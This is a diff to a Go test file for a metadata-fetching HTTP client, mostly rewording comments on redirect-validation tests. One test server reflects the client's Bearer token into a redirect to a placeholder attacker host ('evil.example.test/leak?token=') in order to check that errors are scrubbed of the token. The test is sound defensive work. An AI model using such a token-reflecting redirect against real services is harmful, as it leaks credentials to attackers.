@@ -351,7 +351,7 @@ func TestRedirectHTTPSDowngradeRejected(t *testing.T) {
 		http.Redirect(w, r, target, http.StatusFound)
 	}))
 	defer srv.Close()
-	// Same host:port as the TLS server, but plain http — a scheme downgrade.
+	// Same host:port as the TLS server, but plain http: a scheme downgrade.
 	target = strings.Replace(srv.URL, "https://", "http://", 1) + "/dest"
 
 	c := newTestClient(t, srv, WithRetry(0, time.Millisecond))
@@ -400,18 +400,15 @@ func TestOriginKeyCaseInsensitiveHost(t *testing.T) {
 	}
 }
 
-// TestRedirectReflectingTokenIsRedactedFromError is the H4 regression proof: a
-// hostile metadata endpoint reflects the client's Bearer instance token into a
-// redirect Location whose target (cleartext http to a non-loopback host) makes
-// the redirect fail validation — so the token-bearing URL lands inside the
-// transport/redirect error net/http returns. The Client must scrub the token
-// from EVERY error it hands back, so the returned error (which main.go logs to
-// stderr) must contain no substring of the token.
+// TestRedirectReflectingTokenIsRedactedFromError: a hostile metadata endpoint
+// reflects the Bearer instance token into a redirect Location whose target
+// (cleartext http to a non-loopback host) fails validation, so the token-bearing
+// URL lands inside the error net/http returns. The returned error, which main.go
+// logs to stderr, must contain no substring of the token.
 func TestRedirectReflectingTokenIsRedactedFromError(t *testing.T) {
 	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		// Reflect the actual bearer token the client sent into a cleartext,
-		// non-loopback redirect target — the exact "reflect the bearer into the
-		// URL" vector H4 describes.
+		// Reflect the bearer token the client sent into a cleartext, non-loopback
+		// redirect target.
 		token := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
 		http.Redirect(w, r, "http://evil.example.test/leak?token="+token, http.StatusFound)
 	}))
